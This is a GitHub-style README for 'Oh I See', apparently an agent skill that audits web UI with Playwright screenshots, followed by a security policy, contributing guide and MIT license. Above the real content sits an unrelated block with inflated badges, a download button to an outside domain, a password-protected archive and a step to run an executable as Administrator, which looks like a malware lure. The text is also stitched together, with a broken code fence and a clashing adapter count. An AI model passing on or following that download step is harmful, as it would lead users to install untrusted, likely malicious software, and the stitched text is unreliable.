<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Why this exists

Most UI reviews produce opinions. A reviewer reads a screenshot and writes "the form is too wide". The reader cannot check this. The skill produces a ticket instead:

> `.auth-form` at `src/styles/theme.css:412` has no `max-width`. At 1440px the field spans 1404px, against 380px on the sibling form.

The reference run produced 113 findings. Clustering reduced them to seven root causes. Forty-one findings were the same seven causes, seen from different angles. The seven causes are the work.

## Requirements

- Node.js 18 or later.
- Git.
- curl.
- dig.
- ripgrep (`rg`).
- A dev server for the application under audit.
- Network access.

## Install

```bash
### Install the skill

Copy the skill directory to the skills folder of your agent.

```bash
cp -R skills/oh-i-see ~/.claude/skills/
```

### Verify the install

```bash
node skills/oh-i-see/scripts/lib/check-browser.mjs
```

The command prints `✓ chromium available` when the install is correct.

## Quick start

Run the following commands against a running dev server. Replace `<repo>` and `<port>` with your values. Set `<zone>` to a folder for run output.

```bash
SKILL=skills/oh-i-see

node $SKILL/scripts/probe-stack.mjs --cwd <repo> --port <port> --write-zone <zone>
```

The probe prints the framework, the routes, the Playwright status, and the API ladder. It exits with code 1 if a blocker exists. Do not continue when it fails.

Copy the example files into the write zone, then edit them.

```bash
cp $SKILL/assets/project.config.example.json <zone>/project.config.json
cp $SKILL/assets/flows.example.mjs          <zone>/flows.mjs
```

Write the flows. Read `assets/flows.example.mjs` for the step spec. Choose the journeys from your route table, not from product documentation.

Run the smoke test. Never skip this step.

```bash
node $SKILL/scripts/capture.mjs all --smoke --config <zone>/project.config.json --zone <zone>
```

The smoke test captures two steps. It checks the render, the overflow, the media, and the redirect. Fix every gate failure before you continue.

Generate the worker briefs.

```bash
node $SKILL/scripts/templates.mjs --config <zone>/project.config.json --out <zone> --flows <zone>/flows.mjs
```

This writes `<zone>/BRIEF.md` and one prompt file per flow. Send each worker a one-line prompt that names the file for that worker. Multi-line prompts can fail silently in some harnesses.

Validate, merge, and cluster.

```bash
node $SKILL/scripts/validate-findings.mjs <zone>/findings --root <zone>
node $SKILL/scripts/merge.mjs             <zone>/findings --root <zone>
node $SKILL/scripts/cluster.mjs           <zone>/findings --clusters clusters.mjs
```

Then write the report. Use `references/report-skeleton.md` as the template.

## The phases

| Phase | Purpose | Gate |
|---|---|---|
| Probe | Detect the stack and the API ladder | No blockers |
| Scaffold | Write the config and the flows | Canon block is filled in |
| Smoke | Prove the harness is honest | No gate failures |
| Fan out | One worker per flow | Every step captured |
| Collect | Validate the evidence | Zero errors |
| Verify | Check the severe findings | Each P0 survives |
| Cluster | Group the findings into causes | Each group has a fix |
| Deliver | Write the report | Verdict is first |

Read `skills/oh-i-see/references/workflow.md` for the full runbook.

## Configuration

`project.config.json` holds the run parameters.

| Field | Purpose |
|---|---|
| `baseUrl` | Root URL of the running application |
| `writeZone` | The only folder the audit writes to |
| `auditPaths` | Paths the audit must not change |
| `api` | Backend host, kind, and reachability |
| `canon` | The design rules the project already states |
| `viewports` | Breakpoints to capture |
| `severity` | The rubric for P0 through P4 |

### The canon block

This block is the most important part of the file.

The canon states the fonts, the accent colour, the background, and the colours that the project forbids. The measured pixels then disagree with the canon. The disagreement is the finding.

A project without a written canon produces layout findings only.

### The write zone

The audit is read-only. The write zone is its only output folder.

The skill asks Git whether the zone is ignored. If the zone is not ignored, the probe prints the line to add to `.git/info/exclude`. This keeps the output out of history without changing `.gitignore`.

## Output

```text
<zone>/
  evidence/
    <FLOW>/
      <step-id>/<viewport>/view.png       full-page capture
      <step-id>/<viewport>/view-vp.png    viewport capture
      results.json                       measurements and runtime state
    capture-run.json                     gate failures and totals
  findings/
    <FLOW>.json                          the machine-readable findings
    <FLOW>.md                            the short human report
  all-findings.json                      the merged set
```

Step IDs are folder names. A finding cites them as evidence paths. Treat a step ID as permanent. Renaming one orphans the screenshots and breaks the findings that cite them.

## Backend adapters

The skill ships three adapters. The `api.kind` field selects one.

| Adapter | Behaviour |
|---|---|
| `supabase` | Emulates GoTrue and PostgREST in flight |
| `passthrough` | Uses the real backend |

On the Supabase adapter, the `authOutcome` step field forces a real error response. Supported values are `invalid_credentials`, `email_exists`, `weak_password`, `rate_limit`, and `server_error`. This is how you surface a defect such as a 429 page that shows the message "Incorrect email or password".

### The API ladder

The probe decides which rung the run is on.

| Ladder | Condition | Effect |
|---|---|---|
| 1 | The API answers | Real auth and real data |
| 2 | The API rejects anonymous requests | The run adds a bypass header |
| 3 | The host does not resolve | The run emulates the backend |

On ladder three, row data is synthetic. The report header must say so. Findings that depend on row content are marked `fixtureInduced`. The validator rejects a `fixtureInduced` finding at P0 or P1.

## Troubleshooting

| Symptom | Cause | Action |
|---|---|---|
| `Playwright not found` | No install | Run `npm install` in the repository root |
| `Chromium is missing` | No browser build | Run `npx playwright install chromium` |
| Every screenshot is blank | The dev server is down | Start it, then run the smoke test again |
| Captures time out | The machine is saturated | Reduce the workers per wave to two |
| `brokenMedia` is not zero | Your fixture images | Fix the fixture. Do not file findings |
| The evidence path does not resolve | A step ID changed after the capture | Restore the ID. Do not re-capture |
| The write zone is not ignored | The zone is not in Git's exclude list | Add the line that the probe prints |

## Validation

The reference library validates the skill metadata and the naming rules.

```bash
npx skills-ref validate ./skills/oh-i-see
```


---

# Security Policy

## Supported versions

Only the latest version on the `main` branch is supported with security fixes.

## Reporting a vulnerability

Please do not report security vulnerabilities in public issues.


---

# Contributing

Thanks for helping improve Oh I See.

## Before opening an issue

- Search existing issues and pull requests.
## Pull requests

1. Create a focused branch from `main`.
2. Keep changes small and update related documentation.
3. Run `npm ci --ignore-scripts` and `npm audit --audit-level=high`.
4. Run the relevant validation command from the README.
5. Describe behavior changes and verification steps in the pull request.

By contributing, you agree that your work is provided under the repository's
MIT license.


---

MIT License

Copyright (c) 2026 Taimoor Khan

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
